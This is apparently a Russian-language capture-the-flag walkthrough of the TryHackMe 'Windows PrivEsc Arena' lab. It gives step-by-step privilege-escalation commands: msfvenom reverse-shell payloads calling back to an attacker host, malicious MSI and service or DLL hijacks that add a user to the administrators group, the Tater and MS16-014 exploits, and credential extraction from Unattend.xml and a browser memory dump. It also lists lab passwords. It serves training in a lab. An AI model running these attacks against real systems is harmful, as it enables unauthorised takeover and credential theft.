

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Windows PrivEsc Arena](https://tryhackme.com/r/room/windowsprivescarena) 

Всего 14 заданий:
## Задание 1
Чтобы пройти эту комнату и получить доступ к уязвимой машине Windows, вам нужно сначала подключиться к VPN TryHackMe.
Если вы еще этого не сделали, сначала пройдите комнату OpenVPN и узнайте, как подключиться.

### Ответьте на вопросы ниже
Подключитесь к VPN TryHackMe.
```commandline
Ответ не нужен
```

## Задание 2
В этой комнате вы научитесь различным тактикам повышения привилегий Windows, включая эксплойты ядра, перехват DLL, 
эксплойты служб, эксплойты реестра и многое другое.  Эта лаборатория была создана с использованием семинара Саги 
Шахара privesc ( https://github.com/sagishahar/lpeworkshop )  и использовалась как часть курса Udemy по повышению 
привилегий Windows от The Cyber Mentor ( http://udemy.com/course/windows-privilege-escalation-for-beginners ).   

Все инструменты, необходимые для прохождения этого курса, находятся на рабочем столе пользователя  (C:\Users\user\Desktop\Tools).

Давайте сначала подключимся к машине.   RDP открыт на порту 3389. Ваши учетные данные:

имя пользователя :
пароль пользователя : password321

Для любых административных действий, которые вы можете предпринять, ваши учетные данные:

имя пользователя: TCM
пароль: Hacker123

### Ответьте на вопросы ниже
Разверните машину и войдите в учетную запись пользователя через RDP.
```commandline
Ответ не нужен
```
Откройте командную строку и запустите 'net user'. Кто является другим нестандартным пользователем на машине?
```commandline
TCM
```

## Задание 3
#### Обнаружение

ВМ Windows

1. Откройте командную строку и введите:  `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe` 
2. В Autoruns щелкните вкладку «Logon». 
3. В списке результатов обратите внимание, что запись «My Program» указывает на `«C:\Program Files\Autorun Program\program.exe»`. 
4. В командной строке введите:  
   `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"` 
5. В выводе обратите внимание, что группа пользователей «Everyone» имеет разрешение «FILE_ALL_ACCESS» на файл «program.exe».    

#### Эксплуатация

Кали ВМ

1. Откройте командную строку и введите: `msfconsole`
2. В Metasploit (msf > prompt) введите: `use multi/handler`
3. В Metasploit (msf > prompt) введите: `set payload windows/meterpreter/reverse_tcp`
4. В Metasploit (msf > prompt) введите: `set lhost [ IP-адрес виртуальной машины Kali ]`
5. В Metasploit (msf > prompt) введите: `run`
6. Откройте дополнительную командную строку и введите:  `msfvenom -p windows/meterpreter/reverse_tcp lhost=[ IP-адрес виртуальной машины Kali ] -f exe -o program.exe`
7. Скопируйте сгенерированный файл program.exe на виртуальную машину Windows.

ВМ Windows

1. Поместите program.exe в `«C:\Program Files\Autorun Program»`.
2. Чтобы смоделировать эффект повышения привилегий, выйдите из системы и войдите снова как администратор.

Кали ВМ

1. Дождитесь открытия нового сеанса в Metasploit.
2. В Metasploit (msf > prompt) введите: `sessions -i [Session ID]`
3. Чтобы подтвердить успешность атаки, в Metasploit (msf > prompt) введите: getuid

### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 4
Обнаружение

ВМ Windows

1. Откройте командную строку и введите:  `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
2. В выходных данных обратите внимание, что значение «AlwaysInstallElevated» равно 1.
3. В командной строке введите:  `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
4. В выходных данных обратите внимание, что значение «AlwaysInstallElevated» равно 1.

Эксплуатация

Кали ВМ

1. Откройте командную строку и введите:  `msfconsole`
2. В Metasploit (msf > prompt) введите:  `use multi/handler`
3. В Metasploit (msf > prompt) введите:  `set payload windows/meterpreter/reverse_tcp`
4. В Metasploit (msf > prompt) введите:  `set lhost [ IP-адрес виртуальной машины Kali ]`
5. В Metasploit (msf > prompt) введите:  `run`
6. Откройте дополнительную командную строку и введите:  `msfvenom -p windows/meterpreter/reverse_tcp lhost=[ IP-адрес виртуальной машины Kali ] -f msi -o setup.msi`
7. Скопируйте сгенерированный файл setup.msi на виртуальную машину Windows .

ВМ Windows

1. Поместите 'setup.msi' в 'C:\Temp'.
2. Откройте командную строку и введите:`msiexec /quiet /qn /i C:\Temp\setup.msi`

Наслаждайтесь своей ракушкой! :)


### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 5
Обнаружение

ВМ Windows

1. Откройте командную строку PowerShell и введите:  `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
2. Обратите внимание, что вывод предполагает, что пользователь, принадлежащий «NT AUTHORITY\INTERACTIVE», имеет разрешение «FullContol» на раздел реестра.

Эксплуатация

ВМ Windows

1. Скопируйте `«C:\Users\User\Desktop\Tools\Source\windows_service.c»` на виртуальную машину Kali .

Кали ВМ

1. Откройте windows_service.c в текстовом редакторе и замените команду, используемую функцией system(), на: `cmd.exe /k net localgroup administrators user /add`
2. Выйдите из текстового редактора и скомпилируйте файл, введя в командной строке следующее:  `x86_64-w64-mingw32-gcc windows_service.c -o x.exe` (ПРИМЕЧАНИЕ: если он не установлен, используйте «sudo apt install gcc-mingw-w64») 
3. Скопируйте сгенерированный файл x.exe на виртуальную машину Windows .

ВМ Windows

1. Поместите x.exe в 'C:\Temp'.
2. Откройте командную строку, набрав:  `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /dc:\temp\x.exe /f`
3. В командной строке введите: `sc start regsvc`
4. Можно подтвердить, что пользователь был добавлен в группу локальных администраторов, введя в командной строке следующее: `net localgroup administrators`

### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 6
Обнаружение

ВМ Windows

1. Откройте командную строку и введите:  `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`
2. Обратите внимание, что группа пользователей «Все» имеет разрешение «FILE_ALL_ACCESS» на файл filepermservice.exe.

Эксплуатация

ВМ Windows

1. Откройте командную строку и введите:  `copy /yc:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
2. В командной строке введите: `sc start filepermsvc`
3. Подтвердить, что пользователь был добавлен в группу локальных администраторов, можно, введя в командной строке следующее: `net localgroup administrators`

### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 7
Обнаружение

ВМ Windows

1. Откройте командную строку и введите: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
2. В выводе обратите внимание, что группа «BUILTIN\Users» имеет полный доступ «(F)» к каталогу.

Эксплуатация

Кали ВМ

1. Откройте командную строку и введите: `msfconsole`
2. В Metasploit (msf > prompt) введите: `use multi/handler`
3. В Metasploit (msf > prompt) введите: `set payload windows/meterpreter/reverse_tcp`
4. В Metasploit (msf > prompt) введите: `set lhost [ IP-адрес виртуальной машины Kali] `
5. В Metasploit (msf > prompt) введите: `run`
6. Откройте другую командную строку и введите:  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ IP-адрес виртуальной машины Kali ] -f exe -o x.exe`
7. Скопируйте сгенерированный файл x.exe на виртуальную машину Windows .

ВМ Windows

1. Поместите x.exe в `«C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup»`.
2. Выйдите из системы.
3. Войдите в систему, используя учетные данные администратора.

Кали ВМ

1. Подождите, пока будет создан сеанс, это может занять несколько секунд.
2. В Meterpreter (meterpreter > prompt) введите: `getuid`
3. В выводе обратите внимание, что пользователь — «User-PC\Admin»

### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 8
Обнаружение

ВМ Windows

1. Откройте папку Tools, которая находится на рабочем столе, а затем перейдите в папку Process Monitor.
2. На самом деле исполняемые файлы будут скопированы с хоста жертвы на хост злоумышленника для анализа во время 
   выполнения. В качестве альтернативы, то же самое программное обеспечение может быть установлено на хост 
   злоумышленника для анализа, в случае, если они смогут его получить. Чтобы смоделировать это, щелкните правой 
   кнопкой мыши на Procmon.exe и выберите «Запуск от имени администратора» в меню.
3. В procmon выберите «фильтр». Из самого левого раскрывающегося меню выберите «Имя процесса».
4. В поле ввода в той же строке введите: dllhijackservice.exe
5. Убедитесь, что строка читается как «Имя процесса dllhijackservice.exe, затем Включить», и нажмите кнопку 
   «Добавить», затем «Применить» и, наконец, «ОК». 6. Затем выберите из самого левого раскрывающегося меню 
   «Результат». 7. В поле ввода в той же строке введите: NAME NOT FOUND 8. Убедитесь, что в строке указано «Result 
   is NAME NOT FOUND then Include» и нажмите кнопку «Добавить», затем «Применить» и, наконец, «ОК». 9. Откройте 
   командную строку и введите: sc start dllsvc 10. Прокрутите окно до конца. Один из выделенных результатов 
   показывает, что служба пыталась выполнить «C:\Temp\hijackme.dll», но не смогла этого сделать, так как файл не был 
   найден. Обратите внимание, что «C:\Temp» — это доступное для записи местоположение.


Эксплуатация

ВМ Windows

1. Скопируйте «C:\Users\User\Desktop\Tools\Source\windows_dll.c» на виртуальную машину Kali .

Кали ВМ

1. Откройте windows_dll.c в текстовом редакторе и замените команду, используемую функцией system(), на: `cmd.exe /k net localgroup administrators user /add`
2. Выйдите из текстового редактора и скомпилируйте файл, введя в командной строке следующее:  `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
3. Скопируйте сгенерированный файл hijackme.dll на виртуальную машину Windows.

ВМ Windows

1. Поместите hijackme.dll в 'C:\Temp'.
2. Откройте командную строку и введите: sc stop dllsvc & sc start dllsvc
3. Можно подтвердить, что пользователь был добавлен в группу локальных администраторов, введя в командной строке следующее: net localgroup administrators

### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 9
Обнаружение

ВМ Windows

1. Откройте командную строку и введите:  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

2. Обратите внимание, что вывод предполагает, что пользователь «User-PC\User» имеет разрешение «SERVICE_CHANGE_CONFIG».

Эксплуатация

ВМ Windows

1. В командной строке введите:  sc config daclsvc binpath= "net localgroup administrators user /add"
2. В командной строке введите: sc start daclsvc
3. Подтвердить, что пользователь был добавлен в группу локальных администраторов, можно, введя в командной строке следующее: net localgroup administrators

### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 10
Обнаружение

ВМ Windows

1. Откройте командную строку и введите: sc qc unquotedsvc
2. Обратите внимание, что в поле «BINARY_PATH_NAME» отображается путь, который не заключен в кавычки.

Эксплуатация

Кали ВМ

1. Откройте командную строку и введите:  `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
2. Скопируйте сгенерированный файл common.exe на виртуальную машину Windows .

ВМ Windows

1. Поместите common.exe в 'C:\Program Files\Unquoted Path Service'.
2. Откройте командную строку и введите: sc start unquotedsvc
3. Можно подтвердить, что пользователь был добавлен в группу локальных администраторов, введя в командной строке следующее: `net localgroup administrators`

Для дополнительной практики рекомендуется попробовать комнату TryHackMe Steel Mountain ( https://tryhackme.com/room/steelmountain ).

### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```
## Задание 11
Эксплуатация

ВМ Windows

1. В командной строке введите: `powershell.exe -nop -ep bypass`
2. В командной строке Power Shell введите: `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1 `
3. В командной строке Power Shell введите: `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"` 
4. Чтобы подтвердить успешность атаки, в командной строке Power Shell введите: `net localgroup administrators`


### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```

## Задание 12
Эксплуатация

ВМ Windows

1. Откройте командную строку и введите:  `notepad C:\Windows\Panther\Unattend.xml` 
2. Прокрутите страницу вниз до свойства «<Password>» и скопируйте строку base64, заключенную между тегами «<Value>» под ним.

Кали ВМ

1. В терминале введите: `echo [copied base64] | base64 -d`
2. Обратите внимание на пароль в открытом виде.

### Ответьте на вопросы ниже
Какой пароль в открытом виде содержится в файле Unattend.xml?
```commandline
password123
```

## Задание 13
Эксплуатация

Кали ВМ

1. Откройте командную строку и введите: msfconsole
2. В Metasploit (msf > prompt) введите: use auxiliary/server/capture/http_basic
3. В Metasploit (msf > prompt) введите: set uripath x
4. В Metasploit (msf > prompt) введите: run

ВМ Windows

1. Откройте Internet Explorer и перейдите по адресу: http://[ IP-адрес виртуальной машины Kali ]/x 2.
Откройте командную строку и введите: taskmgr
3. В диспетчере задач Windows щелкните правой кнопкой мыши «iexplore.exe» в столбце «Имя образа» и выберите «Создать файл дампа» во всплывающем меню.
4. Скопируйте созданный файл iexplore.DMP в виртуальную машину Kali.

Кали ВМ

1. Поместите «iexplore.DMP» на рабочий стол.
2. Откройте командную строку и введите:  strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
3. Выберите Копировать строку в кодировке Base64.
4. В командной строке введите: echo -ne [Base64 String] | base64 -d
5. Обратите внимание на учетные данные в выводе.

### Ответьте на вопросы ниже
Нажмите «Завершено», как только вы успешно найдете все пароли.
```commandline
Ответ не нужен
```

## Задание 14
Установить оболочку

Кали ВМ

1. Откройте командную строку и введите:  `msfconsole`
2. В Metasploit (msf > prompt) введите:  `use multi/handler`
3. В Metasploit (msf > prompt) введите:  `set payload windows/meterpreter/reverse_tcp`
4. В Metasploit (msf > prompt) введите:  `set lhost [ IP-адрес виртуальной машины Kali ]`
5. В Metasploit (msf > prompt) введите:  `run`
6. Откройте дополнительную командную строку и введите:  `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[ IP-адрес виртуальной машины Kali ] -f exe > shell.exe`
7. Скопируйте сгенерированный файл shell.exe на виртуальную машину Windows .

ВМ Windows

1. Запустить shell.exe и получить обратную оболочку

Обнаружение и эксплуатация

Кали ВМ

1. В Metasploit (msf > prompt) введите: `run post/multi/recon/local_exploit_suggester`
2. Определите `Exploit/windows/local/ms16_014_wmi_recv_notif` как потенциальную возможность повышения привилегий
3. В Metasploit (msf > prompt) введите: `use  Exploit/windows/local/ms16_014_wmi_recv_notif`
4. В Metasploit (msf > prompt) введите:  `set SESSION [meterpreter SESSION number]`
5. В Metasploit (msf > prompt) введите: `set LPORT 5555`
6. В Metasploit (msf > prompt) введите: `run `

ПРИМЕЧАНИЕ: Оболочка может по умолчанию использовать ваш eth0 во время этой атаки. Если это так, убедитесь, что  вы 
ввели `set lhost [IP-адрес Kali VM ]` и запустите снова.


### Ответьте на вопросы ниже
Нажмите «Завершено» после успешного повышения уровня машины.
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)